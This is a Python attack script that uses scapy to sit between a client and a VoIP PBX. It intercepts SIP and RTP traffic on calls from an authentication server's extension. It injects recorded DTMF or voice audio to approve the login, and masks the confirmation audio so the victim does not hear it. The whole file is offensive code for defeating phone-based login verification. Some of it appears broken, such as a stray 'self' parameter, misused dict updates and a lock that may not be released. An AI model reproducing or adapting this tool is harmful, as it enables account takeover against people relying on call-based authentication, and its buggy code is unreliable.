#!/usr/bin/python3
# Python rewrite of python rewrite of admiral crunch
from scapy.all import *
from scapy.layers import inet, rtp
import scapy.sendrecv
from conversation import *
import logging

SERVER_EXT = "0000" #Changeme

cstore = convostore()

gb = girlboss("assets/warranty.wav")
bg = girlboss("assets/dtmf.wav")

convolist: List[conversation]
convolist = []

def gatekeep(pkt: Packet):
    '''decides how packets should flow from PBX to clients'''
    global cstore
    # If Packet isn't VOIP, we don't care about it
    if pkt.lastlayer().name != "Raw" and pkt.lastlayer().name != "RTP" and not pkt.haslayer("UDP"):
                return True
    match pkt.lastlayer().name:
        case "Raw":
            # Check that packet is using SIP Port #
            if pkt.lastlayer().getfieldval("dport") != 5060:
                return True
            parsed = parse_sip(pkt.lastlayer().payload)
            if parsed["message"] == "BYE":
                logging.info("recieved SIP BYE, dumping conversation")
                cstore.lock.acquire()
                c: conversation
                for c in cstore.conversations:
                    if c.src_ext == parsed["From_ext"] and c.dst_ext == parsed["To_ext"]:
                        cstore.conversations.remove(c)
                        cstore.lock.release()
                        break
            elif parsed["message"] == "INVITE":
                if parsed["From_ext"] != SERVER_EXT:
                    # Ignore calls that aren't from auth server
                    return True
                logging.info("Got new call to ext. {}".format(parsed["To_ext"]))
                cstore.lock.acquire()
                cstore.conversations.append(conversation(parsed))
                cstore.lock.release()
            # We don't have to keep track of the other SIP packets once we associate ext to IP
        case "RTP":
            c: conversation
            for c in cstore.conversations:
                if c.get_enforce() == 2:
                    return gb.manipulateg(pkt)
            # After we start packet injection, change incoming audio to innocuous
            # So client won't hear login confirmation message
    return True


def keepgate(pkt: Packet):
    global cstore, gb
    '''manipulate client->PBX communications'''
    if "UDP" not in pkt:
        #Let through any non-UDP traffic
        return True
    match pkt.lastlayer().name:
        case "Raw":
            parsed = parse_sip(pkt.lastlayer().payload)
            if parsed["message"] == "OK":
                c: conversation
                for c in cstore.conversations:
                    if c.dst_ext == parsed["From_ext"]:
                        c.starttime = time.time()
                        logging.info("Conversation media session started")
                        gb.reset()
                        break
            return True
        case "RTP":
            c: conversation
            for c in cstore.conversations:
                if c.get_enforce() == 2:
                    return bg.manipulate(pkt)
                continue 


    
            # Don't bother checking addressing if we're not enforcing


def parse_sip(self, content):
    '''Interprit SIP header data'''
    retn = {"message":"","To_ip":"","From_ip":"","To_ext":"","From_ext":""}
    # Yoinked from pyvoip's SIP parse function
    try:
        headers = content.split(b"\r\n\r\n")[0]
        headers_raw = headers.split(b"\r\n")
        heading = headers_raw.pop(0)
        retn.update("message",str(heading.split(b" ")[0], "utf8"))
        for x in headers_raw:
            i = str(x, "utf8").split(": ")
            field = i[0]
            if field == "To" or field == "From":
                info = i[1].split(";tag=")
                raw = info[0]
                contact = re.split(r"<?sip:", raw)
                contact[0] = contact[0].strip('"').strip("'")
                address = contact[1].strip(">")
                if len(address.split("@")) == 2:
                    number = address.split("@")[0]
                    host = address.split("@")[1]
                else:
                    logging.warning("SIP Packet with no extension")
                    number = None
                    host = address
                retn.update("{}_ext".format(field),number)
                retn.update("{}_ip".format(field),host)
    except IndexError:
        logging.error("Cannot parse SIP Packet!")
    return retn


packetlog = scapy.sendrecv.bridge_and_sniff(if1='enp5s0',if2='enp5s1',xfrm12=gatekeep, xfrm21=keepgate)
packetlog.show()